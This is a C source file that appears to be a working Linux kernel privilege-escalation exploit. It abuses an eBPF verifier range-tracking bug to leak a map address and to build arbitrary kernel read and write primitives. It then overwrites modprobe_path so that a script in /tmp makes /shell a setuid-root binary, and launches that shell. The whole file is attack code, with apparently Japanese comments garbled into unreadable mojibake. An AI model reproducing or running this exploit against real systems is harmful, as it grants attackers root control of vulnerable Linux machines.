#include <linux/bpf.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include "bpf_insn.h"

#define ofs_array_map_ops  0x121cd20
#define ofs_modprobe_path 0x18510e0

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int bpf(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int map_create(int val_size, int max_entries) {
  union bpf_attr attr = {
    .map_type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(int),
    .value_size = val_size,
    .max_entries = max_entries
  };
  int mapfd = bpf(BPF_MAP_CREATE, &attr);
  if (mapfd == -1) fatal("bpf(BPF_MAP_CREATE)");
  return mapfd;
}

int map_update(int mapfd, int key, void *pval) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key = (uint64_t)&key,
    .value = (uint64_t)pval,
    .flags = BPF_ANY
  };
  int res = bpf(BPF_MAP_UPDATE_ELEM, &attr);
  if (res == -1) fatal("bpf(BPF_MAP_UPDATE_ELEM)");
  return res;
}

int map_lookup(int mapfd, int key, void *pval) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key = (uint64_t)&key,
    .value = (uint64_t)pval,
    .flags = BPF_ANY
  };
  return bpf(BPF_MAP_LOOKUP_ELEM, &attr); // -1 if not found
}

/**
 * �뉐츣�쀣걼mapfd�췇PF�욁긿�쀣궋�됥꺃�밤굮�ゃ꺖��
 */
unsigned long leak_map_address(int mapfd) {
  char verifier_log[0x10000];
  unsigned long val;

  /* BPF�쀣꺆�겹꺀�� */
  struct bpf_insn insns[] = {
    // R0 --> &map[0]
    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0), // key=0
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // map_lookup_elem(mapfd, &k)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),

    // R1 --> var_off=(value=0; mask=0xffffffff00000000)
    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 0),
    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, 32),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
    // R2 --> var_off=(value=0xfffffffe00000001; mask=0)
    BPF_MOV64_IMM(BPF_REG_2, 0xfffffffe),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 1),
    // R1 --> (s32_min=1, s32_max=0, u32_min=1, u32_max=0) / actual:1
    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),

    // R0 --> scalar
    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),

    // BPF�욁긿�쀣겗�㏂깋�с궧�믡꺁�쇈궚
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_0, -0x10),
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), // key
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP), // value
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
    BPF_MOV64_IMM(BPF_REG_ARG4, 0),          // flag
    BPF_EMIT_CALL(BPF_FUNC_map_update_elem), // map_update_elem

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
  };

  /* �썬궞�껁깉�ⓦ겓鼇�츣 */
  union bpf_attr prog_attr = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = sizeof(insns) / sizeof(insns[0]),
    .insns = (uint64_t)insns,
    .license = (uint64_t)"GPL v2",
    .log_level = 2,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };

  /* BPF�쀣꺆�겹꺀�졼굮��꺖�� */
  int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
  if (progfd == -1) fatal("bpf(BPF_PROG_LOAD)");

  /* �썬궞�껁깉�믢퐳�� */
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    fatal("socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    fatal("setsockopt");

  /* �썬궞�껁깉�믣닶�⑨펷BPF�쀣꺆�겹꺀�졼겗�뷴땿竊� */
  write(socks[1], "Hello", 5);

  map_lookup(mapfd, 0, &val);
  return val - 1;
}

/**
 * 餓삥꼷�㏂깋�с궧沃�겳渦쇈겳
 */
unsigned long aar64(int mapfd, unsigned long addr) {
  char verifier_log[0x10000];
  unsigned long val;

  val = 1;
  map_update(mapfd, 0, &val);

  /* BPF�쀣꺆�겹꺀�� */
  struct bpf_insn insns[] = {
    // R8 --> context
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),

    // R0 --> &map[0]
    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0), // key=0
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // map_lookup_elem(mapfd, &k)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),

    // R1 --> var_off=(value=0; mask=0xffffffff00000000)
    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, 0),
    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, 32),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
    // R2 --> var_off=(value=0xfffffffe00000001; mask=0)
    BPF_MOV64_IMM(BPF_REG_2, 0xfffffffe),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 1),
    // R1 --> (s32_min=1, s32_max=0, u32_min=1, u32_max=0) / actual:1
    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),

    // R2 --> (s32_min=0, s32_max=1, u32_min=0, u32_max=1) / actual:1
    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, 0),
    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, 1, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),

    // R1 --> 0 / actual: 1
    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),
    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 1),

    // FP-0x18�ユ쐣�밤겒�앫궎�녈궭�믦Þ營� (*)
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x18),

    // R1 --> 1 / actual: 0x10
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, 0x10-1),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),

    // (*)�㎫뵪�뤵걮�잆궧�욍긿��툓��깮�ㅳ꺍�욍굮訝딀쎑�랃펷ALU sanitation��썮�울펹
    BPF_MOV64_IMM(BPF_REG_ARG2, 0),              // arg2=offset (0)
    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),     // arg3=to (FP-0x20)
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x20),
    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),      // arg4=len (1/0x10)
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),      // arg1=skb
    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),

    // �멥걤�쎼걟�됥굦��(*)��깮�ㅳ꺍�욍굮�뽩풓
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, -0x18),

    // 餓삥꼷�㏂깋�с궧沃�겳�멥걤�뚦룾��
    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 0), // �썬깮�ㅳ꺍�욍걢�됭き�욤씔��

    // �ゃ꺖��걮�잆깈�쇈궭�믡깺�쇈궣�쇘㈉�볝겎�쀣걨�뽧굥
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_1, -0x10),
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), // key
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP), // value
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
    BPF_MOV64_IMM(BPF_REG_ARG4, 0),          // flag
    BPF_EMIT_CALL(BPF_FUNC_map_update_elem), // map_update_elem

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
  };

  /* �썬궞�껁깉�ⓦ겓鼇�츣 */
  union bpf_attr prog_attr = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = sizeof(insns) / sizeof(insns[0]),
    .insns = (uint64_t)insns,
    .license = (uint64_t)"GPL v2",
    .log_level = 2,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };

  /* BPF�쀣꺆�겹꺀�졼굮��꺖�� */
  int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
  if (progfd == -1) fatal("bpf(BPF_PROG_LOAD)");

  /* �썬궞�껁깉�믢퐳�� */
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    fatal("socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    fatal("setsockopt");

  /* �썬궞�껁깉�믣닶�⑨펷BPF�쀣꺆�겹꺀�졼겗�뷴땿竊� */
  char payload[0x10];
  *(unsigned long*)&payload[0] = 0x4141414141414141;
  *(unsigned long*)&payload[8] = addr; // �ゃ꺖��걲�뗣궋�됥꺃��
  write(socks[1], payload, 0x10);

  map_lookup(mapfd, 0, &val);
  return val;
}

/**
 * 餓삥꼷�㏂깋�с궧�멥걤渦쇈겳
 */
unsigned long aaw64(int mapfd, unsigned long addr, unsigned long value) {
  char verifier_log[0x10000];
  unsigned long val;

  val = 1;
  map_update(mapfd, 0, &val);

  /* BPF�쀣꺆�겹꺀�� */
  struct bpf_insn insns[] = {
    // R8 --> context
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),

    // R0 --> &map[0]
    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0), // key=0
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // map_lookup_elem(mapfd, &k)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),

    // R1 --> var_off=(value=0; mask=0xffffffff00000000)
    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, 0),
    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, 32),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
    // R2 --> var_off=(value=0xfffffffe00000001; mask=0)
    BPF_MOV64_IMM(BPF_REG_2, 0xfffffffe),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 1),
    // R1 --> (s32_min=1, s32_max=0, u32_min=1, u32_max=0) / actual:1
    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),

    // R2 --> (s32_min=0, s32_max=1, u32_min=0, u32_max=1) / actual:1
    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, 0),
    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, 1, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),

    // R1 --> 0 / actual: 1
    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),
    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),
    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 1),

    // FP-0x18�ユ쐣�밤겒�앫궎�녈궭�믦Þ營� (*)
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x18),

    // R1 --> 1 / actual: 0x10
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, 0x10-1),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),

    // (*)�㎫뵪�뤵걮�잆궧�욍긿��툓��깮�ㅳ꺍�욍굮訝딀쎑�랃펷ALU sanitation��썮�울펹
    BPF_MOV64_IMM(BPF_REG_ARG2, 0),              // arg2=offset (0)
    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),     // arg3=to (FP-0x20)
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x20),
    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),      // arg4=len (1/0x10)
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),      // arg1=skb
    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),

    // �멥걤�쎼걟�됥굦��(*)��깮�ㅳ꺍�욍굮�뽩풓
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, -0x18),

    // 餓삥꼷�㏂깋�с궧沃�겳�멥걤�뚦룾��
    BPF_MOV64_IMM(BPF_REG_1, value >> 32),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, value & 0xffffffff),
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0), // �썬깮�ㅳ꺍�욍겦��쎑�띹씔��

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
  };

  /* �썬궞�껁깉�ⓦ겓鼇�츣 */
  union bpf_attr prog_attr = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = sizeof(insns) / sizeof(insns[0]),
    .insns = (uint64_t)insns,
    .license = (uint64_t)"GPL v2",
    .log_level = 2,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };

  /* BPF�쀣꺆�겹꺀�졼굮��꺖�� */
  int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
  if (progfd == -1) fatal("bpf(BPF_PROG_LOAD)");

  /* �썬궞�껁깉�믢퐳�� */
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    fatal("socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    fatal("setsockopt");

  /* �썬궞�껁깉�믣닶�⑨펷BPF�쀣꺆�겹꺀�졼겗�뷴땿竊� */
  char payload[0x10];
  *(unsigned long*)&payload[0] = 0x4141414141414141;
  *(unsigned long*)&payload[8] = addr; // �멥걤�쎼걟�뗣궋�됥꺃��
  write(socks[1], payload, 0x10);
}

int main() {
  // BPF�욁긿�쀣굮鵝쒏닇
  int mapfd = map_create(8, 1);

  unsigned long addr_map = leak_map_address(mapfd);
  printf("[+] addr_map = 0x%016lx\n", addr_map);

  unsigned long addr_ops = aar64(mapfd, addr_map - 0x110);
  printf("[+] ops = 0x%016lx\n", addr_ops);
  unsigned long kbase = addr_ops - ofs_array_map_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);

  // modprobe_path��쎑�띷룢��
  aaw64(mapfd,
        kbase + ofs_modprobe_path,
        0x0000782f706d742f); // "/x"

    system("echo '#!/bin/sh' > /tmp/x");
    system("echo 'chown root:root /shell' >> /tmp/x");
    system("echo 'chmod u+s /shell' >> /tmp/x");
    system("chmod +x /tmp/x");
  system("/dummy");

  system("/shell");

  return 0;
}